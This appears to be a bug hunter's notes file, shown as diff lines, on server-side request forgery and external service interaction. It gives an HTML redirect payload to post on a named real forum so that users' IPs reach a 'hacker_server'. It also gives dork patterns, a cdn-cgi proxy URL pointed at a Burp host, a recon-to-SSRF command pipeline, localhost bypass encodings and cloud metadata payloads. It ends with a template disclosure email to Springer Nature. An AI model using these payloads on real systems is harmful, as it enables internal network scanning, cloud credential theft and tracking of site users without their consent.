+External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences.
+
+Impact:
+The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. The facility to generate an email to an arbitrary address is often intended application behavior. But this is not necessarily the case, particulary in cases where the destination address is not explicitly entered on-screen by the user.
+
+
+
+Steps: 
+
+How hacker will exploit  this
+
+Go to https://communities.bentley.com/communities/other_communities/sign-in_assistance_and_web_services/f/cloud-and-web-services-forum/4547/bentley-download?tempkey=2199dab4-d0ba-4965-a445-0ac853b8d278
+
+Reply to any post and in payload add this as source
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Refresh" content="5;url=https://www.google.com">
+</head>
+<body>
+<p>Sorry! We have moved! The new URL is: <a href="https://www.hacker_server.com">https://www.google.com</a></p>
+<p>You will be redirected to the new address in five seconds.</p>
+<p>If you see this message for more than 5 seconds, please click on the link above!</p>
+</body>
+</html>
+
+Once user click on google.com , the ip and logs will interact via bentley server to hacker server.  
+
+
+
+<p>Sorry! We have moved! The new URL is: <a href="https://www.hacker_server.com">https://www.google.com</a></p>
+<p>You will be redirected to the new address in five seconds.</p>
+<p>If you see this message for more than 5 seconds, please click on the link above!</p>
+
+
+
+
+
+
+
+SSRF 
+
+Server Side Request Forgery
+
+
+
+IMP:
+
+1. Do exploit then report
+2. if DNS then no use
+3. Write each step
+
+
+
+Detection SSRF : HTTP
+1. Burp Collaborator
+2. Ext: Collaborator everywhere
+
+
+Exploits:
+1. Port scanning
+2. File over a port
+3. Backend system scan/machine
+4. SSRF to DoS
+5. SSRF information disclosure
+6. SSRF to aws metadata
+7. SSRF to random escaltion
+8. Whitelist/Blacklist SSRF bypass
+
+
+
+
+
+
+Tool: Waybackurls
+
+
+
+
+------------------------------------------------------
+
+Burp
+
+
+Where ?
+
+Headers
+Add link
+upload photo
+insert URL
+add website to bio
+convert files
+
+
+
+SSRF ?
+
+https://target.com/user/profile?imageurl=https://burplink.net
+
+https://clickjacker.io
+
+
+
+https://document.online-convert.com/convert/docx-to-pdf
+
+
+
+
+site.com/admin/ep/img?file=https://test.com/admin.png
+
+IMP : Images : png . jpeg . jpg
+
+
+look for : cdn-cgi
+
+
+.
+#
+@
+
+
+inurl:"/admin/data?id=532"
+
+inurl:return    =https
+
+inurl:url=http
+
+inurl:u=https
+
+inurl:u=http
+
+inurl:redirect?https
+
+inurl:redirect?http
+
+inurl:redirect=https
+
+inurl:redirect=http
+
+inurl:link=http
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com.burp.net:80/21/29703429_17b4da0aef.jpg
+
+
+
+
+
+
+
+SSRF automation
+
+
+subfinder -d target.com | tee subdomain
+cat subdomain | httpx -mc 200 | tee 200
+
+cat gau | gf ssrf | tee ssrf
+cat ssrf | grep "=" | qsreplace "burpcolabrator.net bypass" | tee ssrfinal 
+cat ssrfinal | httpx -sc | grep 200,301
+
+SSRF Bypass
+URL SHORTNER=
+
+
+
+https://web.archive.org/cdx/search/cdx?url=*.naspers.com&output=text&fl=original&collapse=urlkey
+
+========================
+
+Backend
+
+proxy
+page
+width
+url
+redirect
+file
+height
+cdn-cgi
+localhost
+
+
+
+echo tomcat.tiler01.huygens.knaw.nl | gau | tee test-ssrf
+
+
+127.0.0.1
+127.0.1
+127.1
+
+0.0.0.0
+0.0.0
+0.0
+0
+
+[:]
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++==
+
+
+APIPA 
+
+Payloads
+http://169.254.169.254/latest/
+169.254.169.254/latest
+https://169.254.169.254/latest/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+cybersecurity@springernature.com
+
+
+
+Subject: Critical Security Vulnerability Report: SSRF Leading to Cross Port Scan in Springernature Materials Community
+
+Dear Springernature Security Team,
+
+I hope this message finds you well. I am writing to bring a critical security vulnerability to your attention that I discovered on the Springernature Materials Community website. This vulnerability involves Server-Side Request Forgery (SSRF) leading to a cross-port scanning issue, which could potentially expose the platform to various security risks.
+
+Vulnerability Details:
+
+Affected URL Endpoint:
+
+URL: https://materialscommunity.springernature.com/cdn-cgi/image/metadata=copyright,fit=scale-down,format=auto,sharpen=1,quality=95/https:/images.zapnito.com/uploads/54TuuZfRQZm598Ht23D6_image.png
+Similar URLs: There are 62 URLs similar in structure to the one mentioned above.
+Description:
+Through the provided URL endpoint, it is possible to trigger an SSRF vulnerability by manipulating the input parameters. An attacker could craft a specially crafted URL that causes the server to perform unintended requests to internal or external resources. In this case, the vulnerability could be exploited to initiate a cross-port scan on various targets, potentially leading to unauthorized access to sensitive information or network resources.
+
+Impact:
+The exploitation of this vulnerability could result in unauthorized access to sensitive data, abuse of internal resources, and potentially expose the platform to more severe security threats. Attackers could use this vulnerability to gather information about internal network infrastructure, identify open ports, and potentially identify services running on those ports.
+
+Steps to Reproduce:
+
+Craft a malicious URL similar to the provided endpoint, but with altered parameters to trigger SSRF.
+Send the crafted URL to the server to initiate the SSRF attack.
+Monitor network traffic to observe cross-port scanning behavior.
+Recommendation:
+I highly recommend that the Springernature security team takes immediate action to address this vulnerability. This may involve implementing input validation and sanitization mechanisms to prevent SSRF attacks. Additionally, access controls should be put in place to restrict the server's ability to access internal resources or external services without proper authorization.
+
+Additional Information:
+I have conducted a thorough analysis and testing to verify the existence of this vulnerability. To ensure the security of your platform and the sensitive data it handles, it is crucial to address this issue promptly.
+
+Please let me know if you require any further information or assistance in reproducing the vulnerability for verification purposes. I am available to provide additional details and support as needed.
+
+Thank you for your attention to this matter, and I appreciate your commitment to maintaining the security of the Springernature Materials Community platform.
+
+Best Regards,
+
+[Your Name]
+[Your Contact Information]
+
+
+
+
